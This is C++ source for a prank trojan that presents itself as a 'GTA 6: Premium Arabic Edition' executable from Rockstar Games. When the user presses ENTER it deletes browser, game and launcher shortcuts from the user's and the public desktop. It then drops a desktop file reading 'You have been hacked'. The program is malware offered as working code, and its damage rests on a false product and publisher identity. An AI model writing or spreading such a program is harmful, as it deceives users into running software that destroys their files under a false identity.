#include <iostream>
#include <fstream>
#include <filesystem>
#include <cstdlib>

namespace fs = std::filesystem;

int main()
{
    char userProfile[256];
    size_t len = 0;
    getenv_s(&len, userProfile, sizeof(userProfile), "USERPROFILE");
    std::string filecrt = std::string(userProfile) + "\\Desktop\\files.txt";
    // user desktop defs
    std::string robloxlnk = std::string(userProfile) + "\\Desktop\\Roblox Player.lnk";
    std::string googlelnk = std::string(userProfile) + "\\Desktop\\Google Chrome.lnk";
    std::string robloxstudiolnk = std::string(userProfile) + "\\Desktop\\Roblox Studio.lnk";
    std::string bravelnk = std::string(userProfile) + "\\Desktop\\Brave.lnk";
    std::string steamlnk = std::string(userProfile) + "\\Desktop\\Steam.lnk";
    std::string firefoxlnk = std::string(userProfile) + "\\Desktop\\Firefox.lnk";
    std::string sklauncherlnk = std::string(userProfile) + "\\Desktop\\SKlauncher.lnk";
    // allusers desktop defs
    std::string googlelnkpub = "C:\\Users\\Public\\Desktop\\Google Chrome.lnk";
    std::string steamlnkpub = "C:\\Users\\Public\\Desktop\\Steam.lnk";
    std::string bravelnkpub = "C:\\Users\\Public\\Desktop\\Brave.lnk";
    std::string firefoxlnkpub = "C:\\Users\\Public\\Desktop\\Firefox.lnk";
    std::string sklauncherlnkpub = "C:\\Users\\Public\\Desktop\\SKlauncher.lnk";

    std::cout << "GTA 6: Premium Arabic Edition -- Information For Executable\n";
    std::cout << "Application Name: GTA 6: Premium Arabic Edition\n";
    std::cout << "Publisher: Rockstar Games\n";
    std::cout << "Compiler: C++ Visual Studio 2026\n";
    std::cout << "\n";

    std::cout << "Press ENTER to continue\n";
    std::cin.get();

    if (fs::remove(robloxlnk)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(bravelnk)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(googlelnk)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(robloxstudiolnk)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(steamlnk)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    std::cout << "All Users:\n";
    if (fs::remove(steamlnkpub)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(bravelnkpub)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(googlelnkpub)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(firefoxlnkpub)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    if (fs::remove(sklauncherlnkpub)) {
        std::cout << "File has been successfully deleted\n" << std::endl;
    }
    else {
        std::cout << "Failed to delete file\n" << std::endl;
    }
    std::ofstream outFile(filecrt);
    if (outFile.is_open()) {
        outFile << "You have been hacked" << std::endl;
        outFile.close();
        std::cout << "File has been successfully created\n";
    } else {
        std::cout << "File encountered an error while creating\n";
    }

    std::cout << "\nPress ENTER to exit...";
    std::cin.get();

    return 1;
}